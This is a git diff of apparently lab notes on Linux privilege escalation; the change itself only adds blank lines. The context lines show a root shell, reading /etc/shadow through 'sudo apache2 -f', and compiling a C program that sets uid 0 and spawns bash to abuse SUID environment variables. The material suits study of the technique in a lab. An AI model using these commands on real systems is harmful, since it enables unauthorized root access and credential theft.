@@ -63,7 +63,8 @@ root
 sh-4.1# whoami
 root
 ```
-#### Exploiting apache2 as sudo:
+#### Exploiting apache2 as sudo:
+
 ```bash
 TCM@debian:~$ sudo apache2 -f /etc/shadow
 Syntax error on line 1 of /etc/shadow:
@@ -109,6 +110,7 @@ root@debian:~#
 ```
 
 #### Using SUID envoronment variables:
+
 ```bash
 TCM@debian:~$ echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
 TCM@debian:~$ gcc /tmp/service.c -o /tmp/service
